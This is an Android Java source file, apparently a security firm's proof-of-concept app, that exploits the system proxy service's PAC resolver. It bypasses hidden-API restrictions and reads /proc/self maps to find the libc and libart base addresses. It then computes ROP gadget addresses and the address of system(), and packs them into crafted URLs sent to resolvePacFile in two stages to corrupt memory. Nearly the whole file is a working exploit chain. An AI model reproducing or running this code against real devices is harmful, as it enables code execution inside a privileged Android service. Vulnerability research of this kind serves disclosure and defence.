package com.nowsecure.PacTest;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.lang.reflect.InvocationTargetException;
import java.net.*;
import java.util.List;

import java.lang.reflect.Method;
import java.lang.reflect.Field;
import java.lang.reflect.Constructor;
import java.util.Properties;

import android.app.Service;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.content.Context;
import android.view.View;
import android.widget.Toast;

import com.android.net.IProxyService;

import me.weishu.reflection.Reflection;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "PacTest";
    private static ProxySelector ps = ProxySelector.getDefault();
    private IProxyService mProxyService;

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        Reflection.unseal(base);
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            Class localClass = Class.forName("android.os.ServiceManager");
            Method getService = localClass.getMethod("getService", new Class[]{String.class});
            if (getService != null) {
                Object result = getService.invoke(localClass, new Object[]{"com.android.net.IProxyService"});
                Log.d(TAG, result.toString());
                if (result != null) {
                    IBinder binder = (IBinder) result;

                    Log.d(TAG, binder.toString());
                    mProxyService = IProxyService.Stub.asInterface(binder);

                }
            }
        }
        catch (Exception e){
            Log.d(TAG, e.toString());
        }

        int pid = android.os.Process.myPid();
        Log.d(TAG, "PID: " + pid);
        String maps = runCmd("cat /proc/"+pid+"/maps");
        long libc_addr = 0;
        long libart_addr = 0;

        String[] maplines = maps.split("\n");
        for(String mapline : maplines) {
            if (libc_addr == 0 && mapline.contains("libc.so") && mapline.contains("r-xp")) {
                //Log.d(TAG, "cool?");
                Log.d(TAG, mapline);
                String libc_addr_str = mapline.split("-")[0];
                libc_addr = Long.parseLong(libc_addr_str, 16);

                Log.d(TAG, "LIBC: " + libc_addr_str + " (" + libc_addr + ")");

            } else if (libart_addr == 0 && mapline.contains("libart.so") && mapline.contains("r-xp")) {
                //Log.d(TAG, "cool?");
                Log.d(TAG, mapline);
                String libart_addr_str = mapline.split("-")[0];
                libart_addr = Long.parseLong(libart_addr_str, 16);

                Log.d(TAG, "LIBART: " + libart_addr_str + " (" + libart_addr + ")");

            }
        }

        //0x000a37ec: ldr x0, [x0]; ret
        //0x0031a728: mov x0, x1; mov w1, w8; br x2;

        long ldr_x0 = libc_addr+0x000a37ecL;
        long mov_x0_x1 = libart_addr-0x27000L+0x0031a728L;
        long system = libc_addr+0x6deb4L;

        //long num = 0x004100420043L;
        //Log.d(TAG, pack(num));
        try {
            URL uri = new URL("http://x" + pack(ldr_x0) + ":hmmm@stage1-"+Long.toHexString(system));
            Log.d(TAG, "URL:" + uri.toString());
            Log.d(TAG, "Host:" + uri.getHost());

            mProxyService.resolvePacFile(uri.getHost(), uri.toString());

            uri = new URL("http://xYYYYYYYY" + pack(mov_x0_x1) + ":hmmm@stage2");
            Log.d(TAG, "URL:" + uri.toString());
            Log.d(TAG, "Host:" + uri.getHost());

            mProxyService.resolvePacFile(uri.getHost(), uri.toString());

            //uri = new URL("ftp://x/" + pack(mov_x0_x1));
            //List<Proxy> proxies = ps.select(uri.toURI());

            //for (int i =0; i < proxies.size(); i++)
            //    Log.d(TAG, "Proxy: " + proxies.get(i).toString());

            //ProxySelector.setDefault(ps);

        }
        catch (Exception e){
            Log.d(TAG, e.toString());
        }


    }

    // there has to be a better way than this but I dont know it
    private String pack(long num)
    {
        try {
            String escaped = "";
            for (int i = 0; i < 4; i++) {
                long first = (num >> (16 * i)) & 0xff;
                long second = (num >> (8 * (2 * i + 1))) & 0xff;
                escaped += String.format("\\u%02x%02x", second, first);
            }

            Log.d(TAG, escaped);
            Properties p = new Properties();

            p.load(new StringReader("key=" + escaped));
            String unescaped = p.getProperty("key");
            Log.d(TAG, "Unescaped value: " + unescaped);
            return unescaped;
        }
        catch (IOException e)
        {
            return "";
        }
    }

    public String runCmd(String cmd) {

        try {
            // Executes the command.
            Process process = Runtime.getRuntime().exec(cmd);

            // Reads stdout.
            // NOTE: You can write to stdin of the command using
            //       process.getOutputStream().
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
            }
            reader.close();

            // Waits for the command to finish.
            process.waitFor();

            return output.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public void onClickBtn(View v)
    {
        try{
            ProxySelector.setDefault(ps);
            Toast.makeText(this, "Set ProxySelector", Toast.LENGTH_LONG).show();
            Log.d(TAG, "Set proxyselector");
            ps.select(new URI("http://www.fakeurl.com"));
        }
        catch (Exception e){
            Log.d(TAG, e.toString());
        }
    }
}
